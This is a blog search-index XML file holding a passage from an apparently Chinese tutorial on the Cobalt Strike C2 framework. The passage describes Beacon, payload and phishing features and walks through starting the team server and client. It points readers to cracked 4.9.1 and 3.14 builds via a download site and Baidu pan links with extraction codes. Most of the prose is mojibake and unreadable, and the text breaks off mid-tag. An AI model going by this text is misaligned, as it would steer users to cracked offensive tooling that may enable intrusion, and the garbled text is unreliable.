<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CobaltStrike</title>
      <link href="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/"/>
      <url>/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€CobaltStrikeç®€ä»‹"><a href="#ä¸€ã€CobaltStrikeç®€ä»‹" class="headerlink" title="ä¸€ã€CobaltStrikeç®€ä»‹"></a>ä¸€ã€CobaltStrikeç®€ä»‹</h1><p>Cobalt Strike æ˜¯ä¸€æ¬¾ç”±ç¾å›½ç½‘ç»œå®‰å…¨å…¬å¸ Help Systems å¼€å‘çš„ <strong>å•†ä¸šæ¸—é€æµ‹è¯•å·¥å…·</strong>ï¼Œå¹¿æ³›ç”¨äºæ¨¡æ‹Ÿé«˜çº§æŒç»­å¨èƒï¼ˆAPTï¼‰æ”»å‡»å’Œçº¢é˜Ÿæ¼”ç»ƒã€‚å…¶æ ¸å¿ƒåŠŸèƒ½æ˜¯å¸®åŠ©å®‰å…¨å›¢é˜Ÿè¯„ä¼°ä¼ä¸šç½‘ç»œçš„é˜²å¾¡èƒ½åŠ›ï¼Œä½†å› å…¶å¼ºå¤§çš„åŠŸèƒ½ï¼Œä¹Ÿè¢«éƒ¨åˆ†æ”»å‡»è€…æ»¥ç”¨ä¸ºæ¶æ„å·¥å…·ã€‚åœ¨é«˜çº§æ¸—é€æµ‹è¯•å’Œçº¢é˜Ÿæ“ä½œé¢†åŸŸï¼ŒCobalt Strike æ˜¯ä¸€æ¬¾å¤‡å—æ¨å´‡çš„å•†ä¸šå·¥å…·ã€‚å®ƒæä¾›äº†ä¸°å¯Œçš„åŠŸèƒ½å’Œå¼ºå¤§çš„æ¨¡å—ï¼Œç”¨äºæ¨¡æ‹Ÿé«˜çº§æŒç»­æ€§å¨èƒï¼ˆAPTï¼‰ï¼Œæ‰§è¡Œå¤æ‚çš„æ”»å‡»é“¾æ¡ï¼Œå¹¶å¸®åŠ©ç»„ç»‡è¯„ä¼°å’Œæå‡å…¶å®‰å…¨é˜²æŠ¤èƒ½åŠ›ã€‚</p><p>Cobalt Strike ä½œä¸ºä¸€æ¬¾ä¸“ä¸šçš„æ¸—é€æµ‹è¯•å’Œçº¢é˜Ÿæ“ä½œå·¥å…·ï¼Œæ—¨åœ¨å¸®åŠ©å®‰å…¨ä¸“å®¶æ¨¡æ‹ŸçœŸå®çš„æ”»å‡»åœºæ™¯ã€‚å®ƒæ‹¥æœ‰å¼ºå¤§çš„å‘½ä»¤ä¸æ§åˆ¶ï¼ˆC2ï¼‰åŠŸèƒ½ã€ä¸°å¯Œçš„åæ¸—é€æ¨¡å—å’Œçµæ´»çš„è„šæœ¬æ”¯æŒï¼Œä½¿å…¶æˆä¸ºå®‰å…¨è¯„ä¼°å’Œæ”»å‡»æ¨¡æ‹Ÿçš„é‡è¦å·¥å…·ã€‚</p><p>Cobalt Strikeé›†æˆäº†ç«¯å£è½¬å‘ã€æœåŠ¡æ‰«æï¼Œè‡ªåŠ¨åŒ–æº¢å‡ºï¼Œå¤šæ¨¡å¼ç«¯å£ç›‘å¬ï¼Œwin exeæœ¨é©¬ç”Ÿæˆï¼Œwin dllæœ¨é©¬ç”Ÿæˆï¼Œjavaæœ¨é©¬ç”Ÿæˆï¼Œofficeå®ç—…æ¯’ç”Ÿæˆï¼Œæœ¨é©¬æ†ç»‘ï¼›é’“é±¼æ”»å‡»åŒ…æ‹¬ï¼šç«™ç‚¹å…‹éš†ï¼Œç›®æ ‡ä¿¡æ¯è·å–ï¼Œjavaæ‰§è¡Œï¼Œæµè§ˆå™¨è‡ªåŠ¨æ”»å‡»ç­‰ç­‰ã€‚</p><h2 id="1-1-Cobalt-Strikeæ¶æ„"><a href="#1-1-Cobalt-Strikeæ¶æ„" class="headerlink" title="1.1 Cobalt Strikeæ¶æ„"></a>1.1 Cobalt Strikeæ¶æ„</h2><img src="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/%E6%88%AA%E5%B1%8F2025-02-17%2011.29.50.png" style="zoom:40%;"><h2 id="1-2-æ ¸å¿ƒæ¨¡å—ä¸åŠŸèƒ½"><a href="#1-2-æ ¸å¿ƒæ¨¡å—ä¸åŠŸèƒ½" class="headerlink" title="1.2 æ ¸å¿ƒæ¨¡å—ä¸åŠŸèƒ½"></a>1.2 æ ¸å¿ƒæ¨¡å—ä¸åŠŸèƒ½</h2><h3 id="1-2-1-æ ¸å¿ƒæ¨¡å—"><a href="#1-2-1-æ ¸å¿ƒæ¨¡å—" class="headerlink" title="1.2.1 æ ¸å¿ƒæ¨¡å—"></a>1.2.1 æ ¸å¿ƒæ¨¡å—</h3><ul><li><strong>ä¿¡æ ‡ï¼ˆBeaconï¼‰</strong>ï¼šCobalt Strike çš„ä¸»è¦åæ¸—é€è½½è·ï¼Œèƒ½å¤Ÿä¸å›¢é˜ŸæœåŠ¡å™¨å»ºç«‹å‘½ä»¤ä¸æ§åˆ¶ï¼ˆC2ï¼‰é€šé“ï¼Œå¹¶æ‰§è¡Œå¤šç§åæ¸—é€æ´»åŠ¨ï¼Œå¦‚ç½‘ç»œå’Œä¸»æœºæšä¸¾ã€æ–‡ä»¶æ“ä½œã€è¿›ç¨‹æ“ä½œç­‰ã€‚</li><li><strong>ç›‘å¬å™¨ï¼ˆListenersï¼‰</strong>ï¼šç”¨äºç­‰å¾…ä¿¡æ ‡è¿æ¥çš„ C2 æœåŠ¡å™¨ï¼Œæ”¯æŒå¤šç§åè®®ï¼Œå¦‚ HTTP/HTTPSã€DNSã€SMBã€åŸå§‹ TCP ç­‰ï¼Œå¹¶ä¸”å¯ä»¥åœ¨æ¯ç§ç›‘å¬å™¨ç±»å‹ä¸­è¿›è¡Œå„ç§ä¿®æ”¹ä»¥é€‚åº”ä¸åŒçš„æ”»å‡»åœºæ™¯ã€‚</li><li><strong>å®¢æˆ·ç«¯ï¼ˆClientï¼‰</strong>ï¼šæ”»å‡»è€…ä¸å›¢é˜ŸæœåŠ¡å™¨äº¤äº’çš„ç•Œé¢ï¼Œé€šè¿‡å®ƒå¯ä»¥ç®¡ç†ä¿¡æ ‡ä¼šè¯ã€å‘é€å‘½ä»¤ã€æŸ¥çœ‹æ—¥å¿—ã€æ„å»ºè½½è·ã€æ‰§è¡Œæ’ä»¶ä»¥åŠç”ŸæˆæŠ¥å‘Šç­‰ã€‚</li><li><strong>æ”»å‡»è€…è„šæœ¬ï¼ˆAggressor Scriptsï¼‰</strong>ï¼šå…è®¸ç”¨æˆ·è‡ªå®šä¹‰å‘½ä»¤ã€èœå•é€‰é¡¹å’Œç•Œé¢ï¼Œé€šè¿‡ç¼–å†™è„šæœ¬å¯ä»¥æ‰©å±• Cobalt Strike çš„åŠŸèƒ½ï¼Œå¦‚æ·»åŠ æ–°çš„èœå•å¿«æ·æ–¹å¼ã€é“¾æ¥å¤šä¸ªæ”»å‡»æ­¥éª¤ç­‰ã€‚</li><li><strong>å›¢é˜ŸæœåŠ¡å™¨ï¼ˆTeam Serverï¼‰</strong>ï¼šä½œä¸ºä¿¡æ ‡å’Œå®¢æˆ·ç«¯ä¹‹é—´çš„ä¸­é—´äººï¼Œè´Ÿè´£ç®¡ç†ä¿¡æ ‡ä¼šè¯å’Œå®¢æˆ·ç«¯è¿æ¥ï¼Œåè°ƒä¸¤è€…ä¹‹é—´çš„é€šä¿¡ã€‚</li></ul><h3 id="1-2-2-åŠŸèƒ½"><a href="#1-2-2-åŠŸèƒ½" class="headerlink" title="1.2.2 åŠŸèƒ½"></a>1.2.2 åŠŸèƒ½</h3><ul><li><p><strong>å¤šç§ä¸Šçº¿æ–¹å¼</strong>ï¼šæ”¯æŒå¤šç§åè®®å®ç°ä¸»æœºä¸Šçº¿ï¼Œèƒ½å¤Ÿçµæ´»é€‚é…å¤æ‚å¤šå˜çš„ç½‘ç»œç¯å¢ƒï¼Œç¡®ä¿æ¸—é€æµ‹è¯•æµç¨‹é¡ºç•…æ— é˜»ã€‚</p></li><li><p><strong>åŠŸèƒ½æ¨¡å—é›†æˆåº¦é«˜</strong>ï¼šé›†æˆäº†ææƒã€å‡­æ®å¯¼å‡ºã€ç«¯å£è½¬å‘ã€socket ä»£ç†ã€é’ˆå¯¹ Office çš„æ”»å‡»æ‰‹æ®µã€æ–‡ä»¶æ†ç»‘ä»¥åŠé’“é±¼ç­‰ä¸€ç³»åˆ—å®ç”¨åŠŸèƒ½ï¼Œå¯å…¨æ–¹ä½æ»¡è¶³æ¸—é€æµ‹è¯•ä¸­å„ç±»å¤æ‚éœ€æ±‚ã€‚</p></li><li><p><strong>ååŒæ‹“å±•èƒ½åŠ›å¼º</strong>ï¼šå¯ä¸ Mimikatz ç­‰ä¸šç•ŒçŸ¥åå·¥å…·ååŒå·¥ä½œï¼Œè¿›ä¸€æ­¥æŒ–æ˜ç³»ç»Ÿæ·±å±‚æ¬¡æ¼æ´ï¼Œå¢å¼ºæ”»å‡»æ•ˆèƒ½ã€‚</p></li><li><p><strong>åˆ†å¸ƒå¼åä½œæ¶æ„</strong>ï¼šé‡‡ç”¨å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯åˆ†ç¦»çš„æ¶æ„ï¼Œæ”¯æŒåˆ†å¸ƒå¼æ“ä½œï¼Œæ–¹ä¾¿å›¢é˜Ÿæˆå‘˜é«˜æ•ˆååŒï¼Œæå¤§æå‡æ¸—é€æµ‹è¯•çš„æ•ˆç‡ä¸è´¨é‡ã€‚</p></li><li><p><strong>å¼ºå¤§çš„æ”»å‡»æ¨¡å—</strong>ï¼š</p><ul><li><strong>ç½‘ç»œæ”»å‡»</strong>ï¼šæä¾›ç«¯å£æ‰«æå™¨ã€æµè§ˆå™¨ä»£ç†ç­‰åŠŸèƒ½ï¼Œå¯ä»¥å¯¹ç›®æ ‡ç½‘ç»œè¿›è¡Œæ‰«æå’Œæ¸—é€ã€‚</li><li><strong>ç¤¾ä¼šå·¥ç¨‹å­¦æ”»å‡»</strong>ï¼šæ”¯æŒé±¼å‰å¼ç½‘ç»œé’“é±¼ã€ç½‘ç«™å…‹éš†ç­‰æ”»å‡»æ‰‹æ®µï¼Œç”¨äºè·å–ç›®æ ‡ç”¨æˆ·çš„å‡­è¯å’Œä¿¡æ¯ã€‚</li><li><strong>æƒé™æå‡</strong>ï¼šå…·å¤‡æƒé™å‡çº§åŠŸèƒ½ï¼Œå¯ä»¥å¸®åŠ©æ”»å‡»è€…è·å–æ›´é«˜æƒé™ï¼Œä»¥ä¾¿è¿›ä¸€æ­¥æ§åˆ¶ç›®æ ‡ç³»ç»Ÿã€‚</li></ul></li><li><p><strong>çµæ´»çš„è½½è·ç”Ÿæˆ</strong>ï¼šå¯ä»¥æ ¹æ®ä¸åŒçš„æ”»å‡»åœºæ™¯å’Œéœ€æ±‚ï¼Œç”Ÿæˆå„ç§ç±»å‹çš„è½½è·ï¼Œå¦‚ Windows EXEã€DLLã€PowerShell è„šæœ¬ç­‰ã€‚</p></li><li><p><strong>ä¸°å¯Œçš„äº¤äº’åŠŸèƒ½</strong>ï¼šé€šè¿‡ä¸ä¿¡æ ‡çš„äº¤äº’ï¼Œæ”»å‡»è€…å¯ä»¥æ‰§è¡Œå„ç§å‘½ä»¤ï¼Œå¦‚æ–‡ä»¶æ“ä½œã€è¿›ç¨‹æ“ä½œã€ç³»ç»Ÿä¿¡æ¯æ”¶é›†ç­‰ï¼Œå¹¶ä¸”å¯ä»¥å®æ—¶æŸ¥çœ‹å‘½ä»¤çš„æ‰§è¡Œç»“æœã€‚</p></li><li><p><strong>æ•°æ®ç®¡ç†å’Œåˆ†æ</strong>ï¼šæä¾›å‡­æ®ç®¡ç†å™¨ã€æ–‡ä»¶æµè§ˆå™¨ã€äº‹ä»¶æ—¥å¿—ç­‰åŠŸèƒ½ï¼Œæ–¹ä¾¿æ”»å‡»è€…ç®¡ç†å’Œåˆ†æè·å–åˆ°çš„æ•°æ®ã€‚</p></li><li><p><strong>æŠ¥å‘Šç”Ÿæˆ</strong>ï¼šèƒ½å¤Ÿç”Ÿæˆè¯¦ç»†çš„æŠ¥å‘Šï¼Œè®°å½•æ¸—é€æµ‹è¯•çš„å…¨è¿‡ç¨‹ï¼ŒåŒ…æ‹¬æ”»å‡»è·¯å¾„ã€è·å–çš„å‡­è¯ã€æ‰§è¡Œçš„å‘½ä»¤ç­‰ï¼Œæœ‰åŠ©äºæ€»ç»“å’Œè¯„ä¼°æ¸—é€æµ‹è¯•çš„æ•ˆæœã€‚</p></li></ul><h1 id="äºŒã€ä¸»è¦ç‰¹ç‚¹"><a href="#äºŒã€ä¸»è¦ç‰¹ç‚¹" class="headerlink" title="äºŒã€ä¸»è¦ç‰¹ç‚¹"></a>äºŒã€ä¸»è¦ç‰¹ç‚¹</h1><ul><li><p>å¼ºå¤§çš„C2é€šä¿¡ï¼šæ”¯æŒHTTPã€HTTPSã€DNSå’ŒSMBç­‰å¤šç§é€šä¿¡åè®®ï¼Œç¡®ä¿C2é€šä¿¡çš„éšè”½æ€§å’Œç¨³å®šæ€§ã€‚</p></li><li><p>ä¸°å¯Œçš„åæ¸—é€æ¨¡å—ï¼šæä¾›äº†å¤§é‡çš„åæ¸—é€åŠŸèƒ½ï¼Œå¦‚å‡­æ®æ”¶é›†ã€æ¨ªå‘ç§»åŠ¨ã€æŒä¹…æ€§ç­‰ã€‚</p></li><li><p>å›¢é˜Ÿåä½œï¼šæ”¯æŒå¤šç”¨æˆ·åä½œï¼Œä¾¿äºçº¢é˜Ÿæˆå‘˜ä¹‹é—´çš„ååŒä½œæˆ˜ã€‚</p></li><li><p>çµæ´»çš„è„šæœ¬æ”¯æŒï¼šæ”¯æŒAggressorè„šæœ¬å’ŒBeacon Object Filesï¼ˆBOFï¼‰ï¼Œå¯ä»¥æ ¹æ®éœ€æ±‚å®šåˆ¶æ”»å‡»æµç¨‹ã€‚</p></li><li><p>å®æ—¶æ”»å‡»æ¨¡æ‹Ÿï¼šèƒ½å¤Ÿæ¨¡æ‹Ÿé«˜çº§å¨èƒï¼Œå¸®åŠ©ç»„ç»‡å‘ç°å’Œä¿®å¤æ½œåœ¨çš„å®‰å…¨æ¼æ´ã€‚</p></li></ul><h1 id="ä¸‰ã€ä¸‹è½½å®‰è£…ï¼ˆCobaltStrike4-9-1ï¼‰"><a href="#ä¸‰ã€ä¸‹è½½å®‰è£…ï¼ˆCobaltStrike4-9-1ï¼‰" class="headerlink" title="ä¸‰ã€ä¸‹è½½å®‰è£…ï¼ˆCobaltStrike4.9.1ï¼‰"></a>ä¸‰ã€ä¸‹è½½å®‰è£…ï¼ˆCobaltStrike4.9.1ï¼‰</h1><h2 id="3-1-ä¸‹è½½"><a href="#3-1-ä¸‹è½½" class="headerlink" title="3.1 ä¸‹è½½"></a>3.1 ä¸‹è½½</h2><p>Cobalt Strikeæ˜¯å•†ä¸šè½¯ä»¶ï¼ŒåŸåˆ™ä¸Šéœ€è¦è´­ä¹°è®¸å¯è¯æ‰èƒ½ä½¿ç”¨ã€‚</p><p>ä¸è¿‡ä¹Ÿæœ‰ç ´è§£ç‰ˆï¼ŒåŸå§‹é¡¹ç›®åœ°å€ä¸ºï¼š<code>https://github.com/Snowming04/CobaltStrike4.0_related</code>ï¼Œé¡¹ç›®ä¸­ä¹Ÿæœ‰ä¸€äº›æ•™ç¨‹æ–‡æ¡£ï¼Œä¸è¿‡ç»è¿‡æµ‹è¯•è¿æ¥éƒ½æŒ‚æ‰äº†ã€‚ </p><p>æ¨èä¸€ä¸ªä¸‹è½½åœ°å€ï¼š<code>https://www.ddosi.org/cobalt-strike-4-9-1-cracked/</code></p><p>æ–‡ä»¶ç»“æ„ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">CobaltSrike_4.9.1_Cracked_www.ddosi.orgâ”œâ”€Clientâ”‚      cobaltstrike-client.cmdâ”‚      cobaltstrike-client.jarâ”‚      cobaltstrike-client.shâ”‚      cobaltstrike.authâ”‚      uHook.jarâ”‚â””â”€Server    â”‚  c2lint    â”‚  cobaltstrike.auth    â”‚  source-common.sh    â”‚  teamserver    â”‚  TeamServerImage    â”‚    â””â”€third-party            README.winvnc.txt            winvnc.x64.dll            winvnc.x86.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-2-å®‰è£…"><a href="#3-2-å®‰è£…" class="headerlink" title="3.2 å®‰è£…"></a>3.2 å®‰è£…</h2><ul><li>æŠŠCobalt Strikeå®‰è£…åŒ…ä¸Šä¼ è‡³Kaliä¸­ï¼Œå¦‚æœKaliä½œä¸ºæœåŠ¡ç«¯ï¼Œå°±ä½¿ç”¨Serveræ–‡ä»¶å¤¹ï¼ŒClientæ–‡ä»¶å¤¹åœ¨è¢«æ§ç»ˆç«¯ä½¿ç”¨ï¼š</li></ul><img src="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/%E6%88%AA%E5%B1%8F2025-02-17%2010.45.22.png" style="zoom:50%;"><h2 id="3-3-å¼€å¯æœåŠ¡ç«¯"><a href="#3-3-å¼€å¯æœåŠ¡ç«¯" class="headerlink" title="3.3 å¼€å¯æœåŠ¡ç«¯"></a>3.3 å¼€å¯æœåŠ¡ç«¯</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./teamserver Kaliæœ¬æœºIPåœ°å€ è®¾ç½®æœåŠ¡ç«¯çš„å¯†ç <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœteamserveræ–‡ä»¶ä¸å…·å¤‡å¯æ‰§è¡Œæƒé™ï¼Œ<code>chmod u+x å³å¯</code>ï¼Œç„¶åå†é‡æ–°æ‰§è¡Œï¼š</p><img src="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/%E6%88%AA%E5%B1%8F2025-02-17%2010.50.08.png" style="zoom:40%;"><p>å¦‚æœæç¤ºï¼š<code>./TeamServerImage: Permission denied</code>ï¼ŒåŒæ ·ç»™<code>TeamServerImage</code>æ·»åŠ æ‰§è¡Œæƒé™ï¼Œç„¶åé‡æ–°è¿è¡Œï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">â”Œâ”€â”€<span class="token punctuation">(</span>rootğŸ’€kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop/CobaltSrike_4.9.1_Cracked_www.ddosi.org/Server<span class="token punctuation">]</span>â””â”€<span class="token comment"># ./teamserver 172.20.10.4 123456</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Will use existing X509 certificate and keystore <span class="token punctuation">(</span>for SSL<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting teamserver<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Team Server Version: <span class="token number">4.9</span>.1 <span class="token punctuation">(</span>Pwn3rs<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Setting <span class="token string">'https.protocols'</span> system property: SSLv3,SSLv2Hello,TLSv1,TLSv1.1,TLSv1.2,TLSv1.3<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Loading keystrokes.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Loaded <span class="token number">0</span> keystrokes.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Loading screenshots.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Loaded <span class="token number">0</span> screenshots.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Loading downloads.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Loaded <span class="token number">0</span> downloads.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Loading Windows error codes.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Windows error codes loaded<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Loading hosted files<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Loaded <span class="token number">0</span> servers with hosted items<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Loading beacons<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Loaded <span class="token number">0</span> beacons<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Team server is up on <span class="token number">0.0</span>.0.0:50050<span class="token punctuation">[</span>*<span class="token punctuation">]</span> SHA256 <span class="token builtin class-name">hash</span> of SSL cert is: ba703778881a47e5dbb2df1d79b0b68f04ba9fa654f22d1ad9822368846a5839<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚ä¸Šå›¾å‡ºç°SSL cert ç­‰æç¤ºè¡¨ç¤ºæœåŠ¡ç«¯è¿è¡ŒæˆåŠŸã€‚</p><h2 id="3-4-å¼€å¯å®¢æˆ·ç«¯"><a href="#3-4-å¼€å¯å®¢æˆ·ç«¯" class="headerlink" title="3.4 å¼€å¯å®¢æˆ·ç«¯"></a>3.4 å¼€å¯å®¢æˆ·ç«¯</h2><p>Clientä¸­æœ‰å¦‚ä¸‹æ–‡ä»¶ï¼š</p><img src="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/%E6%88%AA%E5%B1%8F2025-02-17%2010.59.04.png" style="zoom:50%;"><h3 id="3-4-1-åœ¨macä¸Šè¿è¡Œå®¢æˆ·ç«¯"><a href="#3-4-1-åœ¨macä¸Šè¿è¡Œå®¢æˆ·ç«¯" class="headerlink" title="3.4.1 åœ¨macä¸Šè¿è¡Œå®¢æˆ·ç«¯"></a>3.4.1 åœ¨macä¸Šè¿è¡Œå®¢æˆ·ç«¯</h3><p>ä¸ºå¯åŠ¨è„šæœ¬æ·»åŠ æ‰§è¡Œæƒé™ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> u+x cobaltstrike-client.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åæ‰§è¡Œå¯åŠ¨è„šæœ¬ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./cobaltstrike-client.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/%E6%88%AA%E5%B1%8F2025-02-17%2011.02.06.png" style="zoom:50%;"><p>é…ç½®Hostä¸»æœºï¼ˆKaliä¸»æœºIPï¼‰ã€Portç«¯å£ï¼ˆåŒæœåŠ¡ç«¯ï¼‰ã€Userç”¨æˆ·åï¼ˆä»»æ„éƒ½è¡Œï¼‰ã€Passwordå¯†ç ï¼ˆæœåŠ¡ç«¯é…ç½®çš„å¯†ç ï¼‰ï¼›</p><img src="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/%E6%88%AA%E5%B1%8F2025-02-17%2011.03.36.png" style="zoom:50%;"><p>ç„¶åç‚¹å‡»Connectï¼š</p><img src="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/%E6%88%AA%E5%B1%8F2025-02-17%2011.04.16.png" style="zoom:50%;"><p>æ£€æŸ¥ä¸€ä¸‹ï¼Œè·ŸæœåŠ¡ç«¯è¯ä¹¦æŒ‡çº¹ä¸€è‡´ï¼Œç¡®è®¤å³å¯ã€‚</p><ul><li>æˆåŠŸè¿æ¥åˆ°æœåŠ¡ç«¯</li></ul><img src="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/%E6%88%AA%E5%B1%8F2025-02-17%2011.05.48.png" style="zoom:50%;"><h3 id="3-4-2-åœ¨win7ä¸Šè¿è¡Œå®¢æˆ·ç«¯"><a href="#3-4-2-åœ¨win7ä¸Šè¿è¡Œå®¢æˆ·ç«¯" class="headerlink" title="3.4.2 åœ¨win7ä¸Šè¿è¡Œå®¢æˆ·ç«¯"></a>3.4.2 åœ¨win7ä¸Šè¿è¡Œå®¢æˆ·ç«¯</h3><p>ipï¼š172.20.10.2</p><img src="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/%E6%88%AA%E5%B1%8F2025-02-17%2011.20.23.png" style="zoom:70%;"><p>é…ç½®ï¼ŒæˆåŠŸè¿æ¥åˆ°æœåŠ¡ç«¯ã€‚</p><img src="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/%E6%88%AA%E5%B1%8F2025-02-17%2011.21.09.png" astyle="zoom:50%;"><p>4.9ç‰ˆæœ¬çš„CSè¿˜æ˜¯å¤ªæ–°äº†ï¼Œä¸å¤ªé€‚åº”ã€‚</p><h1 id="å››ã€ä¸‹è½½å®‰è£…ï¼ˆCobaltStrike-3-14ï¼‰"><a href="#å››ã€ä¸‹è½½å®‰è£…ï¼ˆCobaltStrike-3-14ï¼‰" class="headerlink" title="å››ã€ä¸‹è½½å®‰è£…ï¼ˆCobaltStrike 3.14ï¼‰"></a>å››ã€ä¸‹è½½å®‰è£…ï¼ˆCobaltStrike 3.14ï¼‰</h1><h2 id="4-1-ä¸‹è½½"><a href="#4-1-ä¸‹è½½" class="headerlink" title="4.1 ä¸‹è½½"></a>4.1 ä¸‹è½½</h2><ul><li>cobaltstrike 3.14 æ±‰åŒ–ç‰ˆ.zip é“¾æ¥: <a href="https://pan.baidu.com/s/1AW4nL_cJOsrO64xZQltMZA">https://pan.baidu.com/s/1AW4nL_cJOsrO64xZQltMZA</a> æå–ç : yiqp</li></ul><blockquote><h4 id="å…¶ä»–ä¸‹è½½åœ°å€ï¼š"><a href="#å…¶ä»–ä¸‹è½½åœ°å€ï¼š" class="headerlink" title="å…¶ä»–ä¸‹è½½åœ°å€ï¼š"></a>å…¶ä»–ä¸‹è½½åœ°å€ï¼š</h4><ul><li>è‹±æ–‡ç‰ˆï¼š<br>é“¾æ¥ï¼š<a href="https://mrwu.red/go/?url=https://pan.baidu.com/s/172NbUXaggvHWz9vhI35Nug">https://pan.baidu.com/s/172NbUXaggvHWz9vhI35Nug</a><br>æå–ç ï¼šp2ge</li><li>ä¸­æ–‡ç‰ˆï¼š<br>é“¾æ¥ï¼š<a href="https://mrwu.red/go/?url=https://pan.baidu.com/s/1Ns_mzzcjUne9xsz9M78lHw">https://pan.baidu.com/s/1Ns_mzzcjUne9xsz9M78lHw</a><br>æå–ç ï¼š8iee</li></ul></blockquote><p>æ–‡ä»¶å†…å®¹ï¼š</p><img src="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/%E6%88%AA%E5%B1%8F2025-02-17%2011.44.10.png" style="zoom:50%;"><h2 id="4-2-å®‰è£…"><a href="#4-2-å®‰è£…" class="headerlink" title="4.2 å®‰è£…"></a>4.2 å®‰è£…</h2><p>ç›´æ¥è¿›å…¥æ–‡ä»¶åŒ…ï¼Œèµ‹äºˆå¯æ‰§è¡Œæƒé™å³å¯ã€‚</p><h2 id="4-3-æœåŠ¡ç«¯å¯åŠ¨"><a href="#4-3-æœåŠ¡ç«¯å¯åŠ¨" class="headerlink" title="4.3 æœåŠ¡ç«¯å¯åŠ¨"></a>4.3 æœåŠ¡ç«¯å¯åŠ¨</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./teamserver <span class="token function">ip</span> password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/%E6%88%AA%E5%B1%8F2025-02-17%2013.13.32.png" style="zoom:50%;"><h2 id="4-4-å®¢æˆ·ç«¯å¯åŠ¨"><a href="#4-4-å®¢æˆ·ç«¯å¯åŠ¨" class="headerlink" title="4.4 å®¢æˆ·ç«¯å¯åŠ¨"></a>4.4 å®¢æˆ·ç«¯å¯åŠ¨</h2><h3 id="4-4-1-mac"><a href="#4-4-1-mac" class="headerlink" title="4.4.1 mac"></a>4.4.1 mac</h3><img src="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/%E6%88%AA%E5%B1%8F2025-02-17%2013.15.59.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-Dfile.encoding</span><span class="token operator">=</span>UTF-8 <span class="token parameter variable">-javaagent:CobaltStrikeCN.jar</span> <span class="token parameter variable">-XX:ParallelGCThreads</span><span class="token operator">=</span><span class="token number">4</span> <span class="token parameter variable">-XX:+AggressiveHeap</span> <span class="token parameter variable">-XX:+UseParallelGC</span> <span class="token parameter variable">-jar</span> cobaltstrike.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸ºäº†æ–¹ä¾¿å¯ä»¥åˆ›å»ºä¸€ä¸ªå¯åŠ¨è„šæœ¬ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"java -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar"</span> <span class="token operator">&gt;</span> start.sh<span class="token function">chmod</span> u+x start.sh./start.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¿æ¥é…ç½®ï¼š</p><img src="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/%E6%88%AA%E5%B1%8F2025-02-17%2013.18.48.png" style="zoom:50%;"><p>ç‚¹å‡»è¿æ¥ï¼ŒæˆåŠŸè¿æ¥è‡³æœåŠ¡ç«¯ï¼š</p><img src="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/%E6%88%AA%E5%B1%8F2025-02-17%2013.19.38.png" style="zoom:50%;"><h3 id="4-4-2-win7"><a href="#4-4-2-win7" 